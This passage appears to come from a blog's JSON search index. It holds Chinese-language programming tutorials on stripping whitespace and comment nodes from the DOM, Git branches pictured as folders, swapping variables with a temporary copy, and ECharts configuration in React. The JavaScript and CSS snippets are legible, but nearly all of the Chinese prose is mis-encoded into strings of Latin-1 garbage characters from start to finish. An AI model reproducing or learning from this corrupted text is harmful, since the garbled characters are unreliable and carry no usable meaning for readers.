(\"\\n\\t\") -&gt; æ–‡å­—ç¯€é»ï¼ˆæ›è¡Œï¼‰ æ‰€ä»¥é€™æ™‚å€™å¦‚æœæƒ³æŠ“åˆ° .block ä¸‹çš„ç¬¬ä¸€å€‹ &lt;p&gt;ï¼Œä½ å¯èƒ½æœƒé€™æ¨£å¯«ï¼š 1const p = document.querySelector('.block').firstChild ä½†é€™æ¨£æœƒæŠ“åˆ°çš„æ˜¯ #text (\"\\n\\t\") é€™å€‹æ–‡å­—ç¯€é»ï¼ˆç©ºç™½å­—å…ƒï¼‰ï¼Œæ‰€ä»¥è¦é€™æ¨£å­æ‰èƒ½çœŸçš„æ‰¾åˆ° &lt;p&gt;ï¼š 1234567891011/* firstChild: #text (\"\\n\\t\") nextSibling: #comment nextSibling: #text (\"\\n\\t\") nextSibling: &lt;p&gt; !!! */const p = document.querySelector('.block') .firstChild .nextSibling .nextSibling .nextSibling çœŸçš„æ˜¯æœ‰å¤ éº»ç…©â€¦ï¼Œæ‰€ä»¥ç¹¼çºŒå¾€ä¸‹çœ‹è©²æ€éº¼è§£æ±ºã€‚ é€šé€šç‡’æ¯€ï¼æ‰€ä»¥é€™é‚Šå¯«ä¸€å€‹ function ä¾†æŠŠé€™äº›æ²’ç”¨çš„ç¯€é»ä¸€æ¬¡è™•ç†æ‰ï¼š 123456789101112131415161718192021222324252627282930/* cleanJunkNodes æœƒæ¥æ”¶ä¸€å€‹ç¯€é»ï¼š 1. å–å¾—è©²ç¯€é»ä¸‹çš„æ‰€æœ‰å­ç¯€é» 2. åˆ¤æ–·å­ç¯€é»çš„å€¼ 3. å¦‚æœæ˜¯æ²’ç”¨çš„ç¯€é»å°±åˆªæ‰*/function cleanJunkNodes (node) { // éæ­·æ‰€æœ‰å­ç¯€é» for (let i=0; i&lt;node.childNodes.length; i++) { // å­˜å–ç¬¬ i å€‹å­ç¯€é» let child = node.childNodes[i] // å¦‚æœæ˜¯è¨»è§£ or æ–‡å­—ç¯€é»ï¼ˆåªæœ‰ç©ºç™½å­—å…ƒï¼‰ if ( child.nodeType === 8 || child.nodeType === 3 &amp;&amp; !/\\S/.test(child.nodeValue) ) { // åˆªé™¤å­ç¯€é» node.removeChild(child) // å¾€å‰é€€ä¸€æ ¼ï¼ˆå› ç‚ºé•·åº¦è®ŠçŸ­äº†ï¼‰ i-- } else if (child.nodeType === 1) { // å¦‚æœå­ç¯€é»ä¹Ÿæ˜¯å…ƒç´ ï¼Œä¸Ÿåˆ°éè¿´ cleanJunkNodes æ¸…é™¤åƒåœ¾ç¯€é» cleanJunkNodes(child) } }} åŸ·è¡Œï¼š 123// ï¼ˆä»¥ä¸‹å…©å€‹éƒ½å¯ä»¥ï¼‰cleanJunkNodes(document.body)cleanJunkNodes(document) ç„¶å¾Œå°±å¯ä»¥å¿«æ¨‚é¸å…ƒç´ äº†ï¼š 1const p = document.querySelector('.block').firstChild // çœŸçš„æ˜¯ &lt;p&gt; å‚™è¨»ä¸€ï¼š ä¹‹æ‰€ä»¥å¯ä»¥é€™æ¨£å­åšæ˜¯å› ç‚ºå‚³å…¥çš„ç¯€é»æ˜¯ Objectï¼Œè€Œ Object è¢«å‚³åˆ° function ç•¶ä½œåƒæ•¸çš„æ™‚å€™å‚³çš„æ˜¯ã€Œåƒè€ƒã€è€Œä¸æ˜¯ã€Œå€¼ã€ï¼Œæ‰€ä»¥ä½ æ‰èƒ½å¤ åœ¨ function è£¡é¢æ”¹è®Šå¤–é¢ Object çš„å€¼ã€‚ï¼ˆä¸æ‡‚çš„è©±å»è¤‡ç¿’ ç†è§£ function å‚³éåƒæ•¸çš„æ©Ÿåˆ¶ï¼‰ å‚™è¨»äºŒï¼šé—œæ–¼ nodeType çš„ä»£è™Ÿ 1ï¼š element 9ï¼š document -&gt; æ³¨æ„æ˜¯ document ç‰©ä»¶ ä¸æ˜¯ &lt;html&gt; 3ï¼š text` 8ï¼š comment æ¥ä¸‹ä¾†ä½ åªè¦æŠŠä¸Šé¢çš„ function è·‘ä¸€æ¬¡å°±å¯ä»¥æŠŠæ‰€æœ‰ä¸é‡è¦çš„å…ƒç´ æ¸…æ‰äº†ï¼ˆæŸç¨®æ„ç¾©ä¸Šå¾ˆåƒ CSS resetï¼Ÿï¼‰ï¼š å‚™è¨»ä¸‰ï¼šé—œæ–¼ cleanJunkNodes çš„çµ‚æ­¢æ¢ä»¶ ç•¶ä¸€å€‹ç¯€é»ä¸‹é¢æ²’æœ‰å­ç¯€é»æ™‚ï¼ŒchildNodes æœƒå›å‚³ä¸€å€‹ã€Œç©ºé™£åˆ—ã€ï¼Œé€™æ™‚å€™å°±ä¸æœƒé€²å…¥è¿´åœˆæ¢ä»¶ã€‚","link":"/2022/01/21/dom-remove-junk-nodes/"},{"title":"å¾è³‡æ–™å¤¾ä¾†ç†è§£åˆ†æ”¯çš„æ¦‚å¿µ","text":"åˆ†æ”¯çš„æ¦‚å¿µå…¶å¯¦å°±è·Ÿ å¾è‡ªå·±åšç‰ˆæ§ä¾†å­¸ Git é€™ç¯‡æ–‡ç« å¾ˆç›¸ä¼¼ã€‚æˆ‘å€‘å¯ä»¥ç”¨ã€Œè³‡æ–™å¤¾ã€ä¾†æ¨¡æ“¬ Git åœ¨å»ºç«‹æ¯ä¸€å€‹ commit æ™‚çš„å‹•ä½œï¼Œæˆ‘å€‘ä¹Ÿå¯ä»¥ç”¨ã€Œè³‡æ–™å¤¾ã€ä¾†æ¨¡æ“¬å»ºç«‹åˆ†æ”¯çš„å‹•ä½œã€‚ é€™å€‹åšæ³•é›–ç„¶è½èµ·ä¾†å¾ˆå¥‡å¦™ï¼Œä½†çœŸçš„å¾ˆå¥½ç†è§£ã€‚ å»ºç«‹åˆ†æ”¯é¦–å…ˆï¼Œä½ å…ˆæŠŠæ¯ä¸€å€‹ branch æƒ³æˆæ˜¯ä¸€å€‹è³‡æ–™å¤¾ã€‚ åœ¨ä¸€é–‹å§‹ git init çš„æ™‚å€™æœƒå»ºç«‹ä¸€å€‹ master è³‡æ–™å¤¾ï¼ˆä»£è¡¨ master åˆ†æ”¯ï¼‰ï¼š 1234-- masterï¼ˆä¸»åˆ†æ”¯ï¼‰ -- master_commit1ï¼ˆè³‡æ–™å¤¾ï¼‰ --code --note æ­¤æ™‚ä½ åœ¨ master åˆ†æ”¯ä¸Šåšäº†ä¸€äº› commit å¾Œï¼Œå¯èƒ½æœƒæƒ³è¦é–‹ä¸€å€‹æ–°çš„åˆ†æ”¯ï¼Œå‡è¨­å«åšã€Œnew_featureã€ã€‚æ‰€ä»¥ç¾åœ¨ä½ æœ‰å…©å€‹åˆ†æ”¯çš„è³‡æ–™å¤¾ï¼š 123456789-- masterï¼ˆä¸»åˆ†æ”¯ï¼‰ -- master_commit1ï¼ˆè³‡æ–™å¤¾ï¼‰ --code --note -- master_commit2ï¼ˆè³‡æ–™å¤¾ï¼‰ --code --note-- new_featureï¼ˆæ–°çš„åˆ†æ”¯ï¼‰ æ¥è‘—æ˜¯é‡é»ï¼Œå‡è¨­ new_feature æ˜¯åœ¨ master_commit2 æ™‚æ–°é–‹çš„åˆ†æ”¯ã€‚é€™å€‹æ™‚å€™ new_feature å°±æœƒæœ‰ç•¶æ™‚ master_commit1 è·Ÿ master_commit2 çš„æª”æ¡ˆã€‚ï¼ˆå› ç‚ºå®ƒè¦å»¶çºŒå‰é¢çš„ç‰ˆæœ¬æ¥ä¸‹å»åšï¼Œæ‰€ä»¥å®ƒå°±å¿…é ˆè¦æœ‰é€™å€‹æ™‚å€™çš„æ‰€æœ‰æª”æ¡ˆï¼‰ ä½ ä¹Ÿå¯ä»¥æƒ³æˆæ˜¯æŠŠ master ä¸­çš„æ‰€æœ‰æª”æ¡ˆè¤‡è£½åˆ° new_feature é€™å€‹è³‡æ–™å¤¾ä¸­ï¼š 123456789101112131415-- masterï¼ˆä¸»åˆ†æ”¯ï¼‰ -- master_commit1ï¼ˆè³‡æ–™å¤¾ï¼‰ --code --note -- master_commit2ï¼ˆè³‡æ–™å¤¾ï¼‰ --code --note-- new_featureï¼ˆæ–°çš„åˆ†æ”¯ï¼‰ -- master_commit1ï¼ˆè³‡æ–™å¤¾ï¼‰ --code --note -- master_commit2ï¼ˆè³‡æ–™å¤¾ï¼‰ --code --note æ¥è‘— new_feature å°±å¯ä»¥åœ¨é€™æ¢åˆ†æ”¯ä¸Šç¹¼çºŒæ–°å¢è‡ªå·±çš„ commitï¼š 12345678910111213-- new_featureï¼ˆæ–°çš„åˆ†æ”¯ï¼‰ -- master_commit1ï¼ˆè³‡æ–™å¤¾ï¼‰ --code --note -- master_commit2ï¼ˆè³‡æ–™å¤¾ï¼‰ --code --note -- new_feature_commit1ï¼ˆè³‡æ–™å¤¾ï¼‰ --code --note -- new_feature_commit2ï¼ˆè³‡æ–™å¤¾ï¼‰ --code --note å¦‚æœåˆ°é€™é‚Šä½ éƒ½ç†è§£çš„è©±ï¼Œé‚£æ­å–œä½ ï¼Œä½ å·²ç¶“ç†è§£åˆ†æ”¯çš„æ¦‚å¿µæ˜¯ä»€éº¼äº†ï¼Œå…¶å¯¦å°±æ˜¯åŸæœ¬çš„ commit è³‡æ–™å¤¾å¤–é¢å†å¤šä¸€å±¤è³‡æ–™å¤¾çš„æ¦‚å¿µè€Œå·²ã€‚ master è³‡æ–™å¤¾ï¼ˆåˆ†æ”¯ï¼‰ä¸­æœƒæœ‰è‡ªå·±å°ˆå±¬çš„ commit è³‡æ–™å¤¾ï¼›new_feature è³‡æ–™å¤¾ï¼ˆåˆ†æ”¯ï¼‰ä¹Ÿæœƒæœ‰è‡ªå·±å°ˆå±¬çš„ commit è³‡æ–™å¤¾ã€‚ åˆä½µåˆ†æ”¯æ¥è‘—è¦è¬›è§£åˆä½µåˆ†æ”¯çš„æƒ…æ³ã€‚ æ²¿ç”¨å‰é¢çš„ä¾‹å­ï¼Œç¾åœ¨ç•¶ new_feature åˆ†æ”¯ä¸Šçš„äº‹æƒ…åšå®Œå¾Œï¼Œä½ å°±ç”¨ä¸åˆ°é€™æ¢åˆ†æ”¯äº†ï¼Œæ‰€ä»¥ä½ å¯ä»¥æŠŠå®ƒã€Œæ¥å›å»ã€åŸæœ¬çš„åˆ†æ”¯ï¼ˆmasterï¼‰ã€‚ æ¯”è¼ƒç›´è¦ºçš„æƒ³æ³•æ˜¯æŠŠåœ¨ new_feature ä¸­æ–°å¢çš„ commit ç›´æ¥æ¥å›å» master åˆ†æ”¯ä¸Šï¼Œåƒé€™æ¨£ï¼š 123456789101112131415-- masterï¼ˆä¸»åˆ†æ”¯ï¼‰ -- master_commit1ï¼ˆè³‡æ–™å¤¾ï¼‰ --code --note -- master_commit2ï¼ˆè³‡æ–™å¤¾ï¼‰ --code --note ï¼ˆåœ¨ new_feature ä¸­æ–°å¢çš„ commitï¼‰ -- new_feature_commit1ï¼ˆè³‡æ–™å¤¾ï¼‰ --code --note -- new_feature_commit2ï¼ˆè³‡æ–™å¤¾ï¼‰ --code --note çœ‹ä¸æ‡‚çš„è©±å¯ä»¥æ€è€ƒä¸€ä¸‹é€™å€‹æµç¨‹ï¼š new_feature æ˜¯å¾ master_commit2 é•·å‡ºä¾†çš„ï¼Œæ‰€ä»¥åœ¨é‚£ä¹‹å‰çš„ commit å…§å®¹ç†è«–ä¸Šæ‡‰è©²éƒ½æœƒç›¸åŒï¼Œæˆ‘ä¸éœ€è¦ç®¡å®ƒå€‘ã€‚ æˆ‘è¦åšçš„å°±æ˜¯æŠŠåœ¨ master_commit2 ä¹‹å¾Œçš„ new_feature_commit éƒ½æ¥å›å» master ä¸Šã€‚ æˆ‘çŸ¥é“ä½ ä¹Ÿè¨±æœƒå•ï¼šã€Œé˜¿å¦‚æœ master ä¸Šä¹Ÿæœ‰æ–°çš„ commit3ã€commit4 çš„è©±å‹’ï¼Ÿã€ã€‚ é€™ç¨®æ™‚å€™å¯èƒ½å°±æœƒå¼•ç™¼ã€Œè¡çªï¼ˆconflictï¼‰ã€ï¼Œä¹Ÿå°±æ˜¯ å…©å€‹åˆ†æ”¯éƒ½æ”¹åˆ°åŒä¸€å€‹æª”æ¡ˆ çš„æƒ…æ³ï¼Œä½†é‚£æ˜¯ä¹‹å¾Œæœƒå†è¨è«–çš„äº‹ï¼Œç¾åœ¨åªè¦å…ˆç†è§£é€™å€‹æ¯”è¼ƒå–®ç´”çš„ç‹€æ³å°±è¡Œäº†ã€‚ ç¸½çµæŒ‰ç…§æ…£ä¾‹æˆ‘å€‘ä¾†è¤‡ç¿’ä¸€ä¸‹ï¼š æ¯å€‹åˆ†æ”¯éƒ½å¯ä»¥ç•¶æˆæ˜¯ä¸€å€‹è³‡æ–™å¤¾ å»ºç«‹æ–°çš„åˆ†æ”¯ï¼Œå¯ä»¥æƒ³æˆæ˜¯æŠŠåŸæœ¬åˆ†æ”¯ä¸Šçš„æª”æ¡ˆè¤‡è£½åˆ°æ–°çš„åˆ†æ”¯ä¸Š æ¯å€‹åˆ†æ”¯ä¸Šçš„ commit å½¼æ­¤ä¹‹é–“äº’ä¸ç›¸å¹² æŠŠ A åˆ†æ”¯åˆä½µåˆ° B åˆ†æ”¯ï¼Œç­‰æ–¼æ˜¯æŠŠåœ¨ A åˆ†æ”¯æ–°å¢çš„ commit æ¥å›å» B åˆ†æ”¯çš„ commit ä¸Š","link":"/2021/12/12/easy-way-to-understand-branch/"},{"title":"æ€éº¼è®“ä¸€èˆ¬äººè½æ‡‚å·¥ç¨‹å¸«è…¦è£¡çš„ã€Œäº¤æ›ã€","text":"ç°¡å–®çš„äº‹æƒ…ï¼Œä¸è¦æƒ³å¾—å¤ªè¤‡é›œã€‚ ç°¡è¿°é€™ç¯‡æ–‡ç« æ˜¯æˆ‘æŸå¤©è…¦æ´çªç„¶é–‹è€Œæƒ³å‡ºä¾†çš„ï¼Œç›®çš„æ˜¯å¸Œæœ›è®“æ²’æœ‰ç¨‹å¼åŸºç¤çš„äººä¹Ÿèƒ½ç†è§£ã€Œåœ¨ç¨‹å¼çš„ä¸–ç•Œè£¡ï¼ŒæŠŠå…©å€‹æ±è¥¿äº¤æ›ã€ä»£è¡¨çš„æ„æ€æ˜¯ä»€éº¼ã€‚ èªªæ•…äº‹æ™‚é–“å¦‚æœä½ æ²’æœ‰å­¸éç¨‹å¼ï¼Œé‚£ä½ è…¦è¢‹ä¸­çš„ã€Œäº¤æ›ã€æ‡‰è©²æ˜¯é•·é€™æ¨£å­ï¼š ä½†æœ‰å­¸éç¨‹å¼çš„äººè…¦ä¸­çš„ã€Œäº¤æ›ã€å»æ˜¯é•·é€™æ¨£å­ï¼š WTFï¼Ÿå·¥ç¨‹å¸«æ˜¯å¸äº†ä»€éº¼ï¼Ÿç‚ºä»€éº¼è¦ç”¨é€™éº¼åäººé¡çš„æ–¹å¼æ€è€ƒï¼Ÿåœ¨æˆ‘é‚„ä¸æ‡‚ç¨‹å¼çš„æ™‚å¾Œæˆ‘ä¹Ÿç–‘æƒ‘éé€™å€‹å•é¡Œã€‚ ä½†å…¶å¯¦æˆ‘å€‘æ¯å€‹äººéƒ½æœ‰éé€™ç¨®æ€è€ƒæ¨¡å¼ï¼Œåªæ˜¯æ²’æœ‰ç™¼ç¾è€Œå·²ã€‚æ‰€ä»¥æˆ‘æ¥ä¸‹ä¾†å°±ä¾†è§£é‡‹åˆ°åº•æ˜¯ä»€éº¼äº‹æƒ…ï¼Ÿ å–éŒ¯æª”æ¡ˆåç¨±çš„æ…˜ç—›ä¸çŸ¥é“ä½ æœ‰æ²’æœ‰é€™æ¨£çš„ç¶“é©—ï¼Œåƒæ˜¯æŠŠå…©å¼µåœ–ç‰‡çš„åå­—å–éŒ¯ï¼Œåƒé€™æ¨£ï¼š é‚£ä½ è©²æ€éº¼æŠŠé€™å…©å€‹åå­—äº¤æ›ï¼Ÿæˆ‘ç›¸ä¿¡å¤§éƒ¨åˆ†äººæ‡‰è©²æ˜¯é€™æ¨£å­åšçš„ï¼š ï¼ˆå‚™è¨»ï¼šæˆ‘å¥³å‹ç›´æ¥å—†èªªã€Œæˆ‘éƒ½ç›´æ¥æ”¹åç¨±æ¬¸ï¼Œä¾‹å¦‚ï¼šã€å®‡å®™å¤§ç‡’è³£-01ã€ï¼Œåªæœ‰ä½ ç”¨é€™ç¨®åšæ³•å§ã€ã€‚å¥½å•¦â€¦å¦‚æœä½ ä¸æ˜¯é€™æ¨£å­åšçš„è©±ï¼Œé‚£ä½ å°±ç•¶ä»Šå¤©å­¸åˆ°ä¸€ç¨®æ–°çš„åšæ³•å§ï¼ï¼‰ æŠŠè©³ç´°æ­¥é©Ÿå¯«å‡ºä¾†çš„è©±å°±æ˜¯ï¼š è¤‡è£½ä¸€å€‹å®‡å®™å¤§ç‡’è³£ï¼Œå¾—åˆ°ã€Œå®‡å®™å¤§ç‡’è³£ï¼è¤‡è£½ã€ æŠŠã€Œå®‡å®™å¤§ç‡’è³£ã€åˆªé™¤ æŠŠã€Œé»ƒé‡‘æ¯”ä¾‹ç‡’è³£ã€æ”¹æˆã€Œå®‡å®™å¤§ç‡’è³£ã€ æœ€å¾ŒæŠŠã€Œå®‡å®™å¤§ç‡’è³£ï¼è¤‡è£½ã€æ”¹æˆã€Œé»ƒé‡‘æ¯”ä¾‹ç‡’è³£ã€ å®Œæˆï¼ ç‚ºä»€éº¼è¦å…ˆè¤‡è£½ä¸€ä»½ï¼Ÿå¾ˆç°¡å–®å˜›ï¼Œå› ç‚ºã€Œä¸èƒ½æœ‰åŒæ¨£çš„æª”æ¡ˆåç¨±å•Šã€ï¼Œé€™å€‹é“ç†å¤§å®¶éƒ½å¾ˆæ¸…æ¥šï¼Œåœ¨å¯«ç¨‹å¼çš„æ™‚ä¹Ÿæ˜¯ä¸€æ¨£ï¼Œåªæ˜¯ç¨å¾®æ›å€‹è§’åº¦ä¾†æ€è€ƒè€Œå·²ï¼Œä½†èƒŒå¾Œçš„é“ç†éƒ½ä¸€æ¨£ã€‚ å…¶å¯¦ç†è§£åˆ°é€™é‚Šå°±å·®ä¸å¤šäº†ï¼Œæ¥ä¸‹ä¾†çš„éƒ¨åˆ†åªæ˜¯è®“æœ‰èˆˆè¶£çš„äººå­¸å€‹æ¦‚å¿µï¼Œçœ‹ä¸æ‡‚ä¹Ÿæ²’é—œä¿‚ã€‚ é¦–å…ˆè¦çŸ¥é“åœ¨ç¨‹å¼çš„ä¸–ç•Œè£¡ä½ ä¸èƒ½å¹«è®Šæ•¸æ”¹åç¨±ï¼Œåªèƒ½æ”¹è®Šæ•¸çš„å€¼ã€‚ æ„æ€æ˜¯èªªå‡è¨­æˆ‘æœ‰å…©å€‹è®Šæ•¸ï¼š 12let picture1 = 'å®‡å®™å¤§ç‡’è³£.jpg'let picture2 = 'é»ƒé‡‘æ¯”ä¾‹ç‡’è³£.jpg' ä½ çµ•å°ä¸å¯èƒ½ç›´æ¥æŠŠ picture1 æ”¹æˆ picture2ï¼Œä½ åªèƒ½é€éã€Œè®Šæ•¸å€¼ã€ä¾†ä¿®æ”¹è®Šæ•¸ï¼š 12picture1 =&gt; picture2 // éŒ¯èª¤çš„åšæ³•picture1 = 'å®‡å®™å¤§ç‡’è³£.jpg' // æ­£ç¢ºçš„åšæ³• æ‰€ä»¥è¦æ€éº¼æŠŠå…©å€‹è®Šæ•¸çš„å€¼äº¤æ›ï¼Ÿå¾ˆç°¡å–®å˜›ï¼Œç›´æ¥ã€Œé‡æ–°è³¦å€¼ã€å°±å¥½å•¦ï¼š 12picture1 = picture2 // æŠŠ 2 çš„å€¼çµ¦ 1picture2 = picture1 // æŠŠ 1 çš„å€¼çµ¦ 2 ä½†é€™æ¨£å­æ˜¯ä¸å°çš„ï¼Œåœ¨ä½ åš picture1 = picture2 çš„æ™‚å€™ï¼Œpicture1 çš„å€¼å°±å·²ç¶“ä¸æ˜¯åŸæœ¬çš„å€¼äº†ï¼Œæ‰€ä»¥ä¸‹ä¸€è¡Œ picture2 = picture1 çš„ picture1 æœƒæ˜¯é‡æ–°è³¦å€¼å¾Œçš„å€¼ï¼Œä½ ä»”ç´°æ€è€ƒä¸€ä¸‹æ¯å€‹æ­¥é©Ÿå°±èƒ½ç†è§£æ„æ€äº†ï¼š 12picture1 = picture2 // picture1 çš„å€¼è®Šæˆ 'é»ƒé‡‘æ¯”ä¾‹ç‡’è³£.jpg'picture2 = picture1 // picture2 åƒè€ƒçš„å€¼é‚„æ˜¯ 'é»ƒé‡‘æ¯”ä¾‹ç‡’è³£.jpg' ä¸æ˜¯ 'å®‡å®™å¤§ç‡’è³£.jpg' é‚£è¦æ€éº¼åšæ‰æ˜¯å°çš„ï¼Ÿç”¨æˆ‘å€‘ä¸€é–‹å§‹èªªçš„ã€Œè¤‡è£½ã€å¤§æ³•ï¼š 123picture1_copy = picture1 // å…ˆè¤‡è£½ä¸€ä»½ 'å®‡å®™å¤§ç‡’è³£.jpg'picture1 = picture2 // æŠŠåŸæœ¬çš„ pictur1 æ”¹æˆ 'é»ƒé‡‘æ¯”ä¾‹ç‡’è³£.jpg'picture2 = picture1_copy // æœ€å¾Œå†æŠŠ picutre2 æ”¹æˆè¤‡è£½å¥½çš„ 'å®‡å®™å¤§ç‡’è³£.jpg' é€™æ¨£å­åšå°±å¯ä»¥é¿å…æ‰å‰›å‰›çš„å•é¡Œï¼Œæ­£ç¢ºçš„è®“ picture2 å„²å­˜åŸæœ¬ picture1 çš„å€¼ã€‚è€Œé€™ä¹Ÿæ˜¯ç‚ºä»€éº¼å·¥ç¨‹å¸«è¦å¤šç¹ä¸€åœˆçš„åŸå› ã€‚ çµå°¾å…¶å¯¦å°±æ˜¯æˆ‘è…¦è¢‹çªç„¶æƒ³åˆ°çš„æƒ³æ³•è€Œå·²ï¼Œæˆ‘ä¹Ÿä¸ç¢ºå®šé€™ç¨®èªªæ³•æœ‰æ²’æœ‰æ¯”è¼ƒå¥½ç†è§£ä¸€äº›ï¼Œå¦‚æœä½ è¦ºå¾—æ²’æœ‰å¾ˆå¥½ç†è§£çš„è©±é‚£çµ•å°æ˜¯æˆ‘æ–‡ç­†ä¸å¥½çš„å•é¡Œï¼Œä¸æ˜¯ä½ çš„éŒ¯ã€‚ ç¸½ä¹‹å‘¢ï¼Œå°±ç•¶ä½œæˆ‘éš¨ä¾¿å¯«å¯«å»¢æ–‡ï¼Œå¤§å®¶éš¨ä¾¿çœ‹çœ‹å°±å¥½ã€‚","link":"/2022/02/02/easy-way-to-understand-swap/"},{"title":"Echarts Note","text":"ç¬¬ä¸€æ¬¡å˜—è©¦åœ–è¡¨æ‡‰ç”¨ã€‚ åŸºæœ¬è³‡æ–™çµæ§‹èˆ‡è§€å¿µè§€å¿µecharts å…¶å¯¦å°±æ˜¯ä¸€å€‹å¹«ä½ è™•ç†ã€Œåœ–è¡¨å¯¦ç¾ï¼ˆimplementï¼‰ã€ çš„å¥—ä»¶ï¼Œä½ åªè¦ä¾ç…§æ–‡ä»¶ä¸Šçš„ é…ç½® ä¾†åšè¨­å®šå°±æœƒè‡ªå‹•å¹«ä½ ç”¢ç”Ÿå°æ‡‰çš„åœ–è¡¨ï¼Œæ‰€ä»¥ä½ ä¸éœ€è¦èŠ±å¿ƒæ€åœ¨ã€Œå¦‚ä½•å»ºç«‹åœ–è¡¨ã€é€™ä»¶äº‹æƒ…ä¸Šï¼ˆä¸€å€‹å¯¦éš›æ¡ˆä¾‹æ˜¯ D3.jsï¼‰ã€‚ åŸºæœ¬é…ç½®ç¯„ä¾‹1234567891011121314151617181920const option = { title: { text: 'åœ–è¡¨çš„æ¨™é¡Œ' }, tooltip: {}, legend: { data: ['é”€é‡'] }, xAxis: { data: ['è¡¬è¡«', 'ç¾Šæ¯›è¡«', 'é›ªçººè¡«', 'è£¤å­', 'é«˜è·Ÿé‹', 'è¢œå­'] }, yAxis: {}, series: [ { name: 'é”€é‡', type: 'bar', data: [5, 20, 36, 10, 10, 20] } ]} é€™é‚Šçš„é…ç½®ä½ æ­é…ä¸‹åœ–ä¸€èµ·çœ‹ä»¥å¾Œå¤§æ¦‚å°±èƒ½ç†è§£å…©è€…ä¹‹é–“çš„å°æ‡‰é—œä¿‚ï¼š è£œå……ï¼š tooltip hover æ™‚æœƒæœ‰ popup é¡¯ç¤ºè¨Šæ¯ legend æ˜¯ç”¨ä¾†éåˆ‡æ›å–®ä¸€åœ–è¡¨çš„é¡¯ç¤º or éš±è—ï¼ˆéœ€åœ¨ series.name è¨­ç½®å°æ‡‰åç¨± ï¼‰ series ä¸»è¦æ˜¯ç”¨ä¾†ä»£è¡¨ã€Œè³‡æ–™ã€ã€‚ä¹ŸåŒ…å«å…¶ä»–çš„è¨­å®šï¼Œåƒæ˜¯ type: bar ä»£è¡¨ä»¥æŸ±ç‹€åœ–å‘ˆç¾ï¼Œè€Œ name å‰‡ä»£è¡¨è©²è³‡æ–™çš„åç¨±ï¼Œä»¥æ­¤é¡æ¨æ­¤ã€‚ æœ€åŸºæœ¬çš„é…ç½®å…¶å¯¦å°±å¤§æ¦‚åŒ…å«ä»¥ä¸Šé€™äº›ï¼Œå…¶ä»–çš„éƒ½åªæ˜¯å¾€å¾Œå»¶ä¼¸è€Œå·²ã€‚ç•¶ä½ ç¢°åˆ°ä»»ä½•ç–‘æƒ‘æ™‚ï¼Œè«‹å‹™å¿…åƒè€ƒ API Spec ä¾†å­¸ç¿’èˆ‡ç·´ç¿’ã€‚ä¸éœ€è¦æ­»è¨˜ç¡¬èƒŒï¼Œç•¶ä½ ç”¨çš„å¤šæ™‚å°±æœƒæ…¢æ…¢è¨˜ä½äº†ã€‚ åœ–è¡¨å°ºå¯¸åœ–è¡¨é è¨­æœƒå¡«æ»¿å®¹å™¨çš„å¯¬èˆ‡é«˜ï¼Œä¾‹å¦‚ï¼š 1234.wrapper { width: 400px; height: 400px;} 123456789101112131415161718192021222324252627282930313233343536import * as echarts from 'echarts'import { useEffect, useRef } from 'react'const option = { title: { text: 'åœ–è¡¨çš„æ¨™é¡Œ' }, tooltip: {}, legend: { data: ['éŠ·é‡'] }, xAxis: { data: ['è¡¬è¡«', 'ç¾Šæ¯›è¡«', 'é›ªçººè¡«', 'è£¤å­', 'é«˜è·Ÿé‹', 'è¢œå­'] }, yAxis: {}, series: [ { name: 'éŠ·é‡', type: 'bar', data: [5, 50, 36, 10, 10, 20] } ]}function App() { const chartWrapper = useRef(null) useEffect(() =&gt; { const myChart = echarts.init(chartWrapper.current) myChart.setOption(JSON.parse(JSON.stringify(option))) }, []) return &lt;div ref={chartWrapper} className='chat-wrapper'&gt;&lt;/div&gt;}export default App é€™æ¨£å­åœ–è¡¨å°±æœƒæ˜¯ 400x400 çš„å¤§å°ã€‚ è‡ªå‹•èª¿æ•´å¤§å°å¦‚æœè¦æ‰‹å‹•èª¿æ•´åœ–è¡¨å¤§å°çš„è©±ï¼Œå¯ä»¥ç”¨åœ¨ init æ™‚åŠ ä¸Š configï¼š 1234const myChart = echarts.init(chartWrapper.current, null, { width: 600, height: 600}) å¦‚æœè¦éš¨è¦–çª—æ”¹è®Šæ™‚èª¿æ•´å¤§å°çš„è©±ï¼Œå¯ä»¥ç”¨åœ¨ window.onResize æ™‚å‘¼å«chart.resize() ä¾†æ”¹è®Šåœ–è¡¨å¤§å°ï¼š 123456789window.onresize = () =&gt; { const myChart = echarts.init(chartWrapper.current) myChart.setOption(JSON.parse(JSON.stringify(option))) // æ ¹æ“š body çš„å¯¬é«˜ä¾†èª¿æ•´å¤§å° myChart.resize({ width: document.body.clientWidth - 20, height: document.body.clientHeight - 20 })} åœ–è¡¨æ¨£å¼è¨­å®šæ¨£å¼çš„æ–¹æ³•æ˜¯é€éåœ¨ option ä¸­åšè¨­å®šï¼Œå¯ä»¥è¨­å®šåœ¨ã€Œglobalã€æˆ–ã€Œseriesã€èº«ä¸Šã€‚ 1234567891011121314151617181920212223242526const option = { // global color: ['#003366', '#006699', '#4cabce'], legend: { orient: 'vertical', top: 'center', right: 0 }, dataset: { source: [ ['product', '2015', '2016', '2017'], ['Matcha Latte', 43.3, 85.8, 93.7], ['Milk Tea', 83.1, 73.4, 55.1], ['Cheese Cocoa', 86.4, 65.2, 82.5], ['Walnut Brownie', 72.4, 53.9, 39.1] ] }, xAxis: { type: 'category' }, yAxis: {}, series: [ { type: 'bar' }, { type: 'bar' }, // series æœƒè¦†è“‹æ‰ global çš„è¨­å®š { type: 'bar', color: 'red' } ]} DatasetDataset æ˜¯ä¸€ç¨®ã€Œè¨­å®šè³‡æ–™ã€çš„æ–¹å¼ï¼Œå®˜æ–¹æ²’æœ‰è¦å®šä½ ä¸€å®šè¦é€™æ¨£å­åšï¼Œä¸éé€™æ¨£å­åšæœƒç‚ºä½ å¸¶ä¾†ä¸€äº›å¥½è™•ï¼Œåƒæ˜¯æé«˜å¯é‡ç”¨æ€§ã€è³‡æ–™æ ¼å¼æœƒæ›´å¥½é–±è®€ç­‰ç­‰ã€‚ å…ˆä¾†çœ‹ä¸€ä¸‹åŸæœ¬çš„å¯«æ³•ï¼š 123456789101112131415161718192021222324252627const option = { xAxis: { type: 'category', data: ['Matcha Latte', 'Milk Tea', 'Cheese Cocoa', 'Walnut Brownie'] }, yAxis: { type: 'value', position: 'right' }, series: [ { name: '2015', type: 'bar', data: [89.3, 92.1, 94.4, 85.4] }, { name: '2016', type: 'bar', data: [95.8, 89.4, 91.2, 76.9] }, { name: '2017', type: 'bar', data: [97.7, 83.1, 92.5, 78.1] } ]} æ”¹ç”¨ Dataset çš„å½¢å¼ä¾†å¯«æœƒè®Šé€™æ¨£ï¼š 123456789101112131415161718192021const option = { tooltip: {}, xAxis: { type: 'category' }, yAxis: { type: 'value', position: 'right' }, // å¯ä»¥ \"ç›´æ’\" 